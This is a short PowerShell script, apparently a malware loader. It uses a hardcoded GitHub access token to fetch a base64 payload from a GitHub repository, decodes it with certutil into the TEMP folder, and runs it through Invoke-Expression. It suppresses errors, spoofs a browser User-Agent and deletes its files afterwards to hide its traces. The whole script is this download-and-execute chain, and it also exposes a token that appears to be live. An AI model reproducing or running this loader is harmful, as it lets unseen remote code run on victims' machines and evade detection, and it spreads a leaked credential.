# decoder.ps1 - certutil decodes base64 payload
$ErrorActionPreference = 'SilentlyContinue'

$b64File = "$env:TEMP\payload.b64"
$decodedFile = "$env:TEMP\decoded.ps1"

# Cleanup old files FIRST (certutil fails if output exists)
Remove-Item $b64File -Force -ErrorAction SilentlyContinue
Remove-Item $decodedFile -Force -ErrorAction SilentlyContinue

$githubToken = "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"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $headers = @{
        "Authorization" = "token $githubToken"
        "Accept" = "application/vnd.github.v3+json"
    }
    $fileInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/slynet999-coder/Yambo/contents/payload.b64" -Headers $headers
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $wc.DownloadFile($fileInfo.download_url, $b64File)
} catch {}

# certutil decode
if (Test-Path $b64File) {
    certutil -decode $b64File $decodedFile
}

# Execute decoded payload
if (Test-Path $decodedFile) {
    $content = [System.IO.File]::ReadAllText($decodedFile, [System.Text.Encoding]::UTF8)
    Invoke-Expression $content
}

# Cleanup
Remove-Item $b64File -Force -ErrorAction SilentlyContinue
Remove-Item $decodedFile -Force -ErrorAction SilentlyContinue
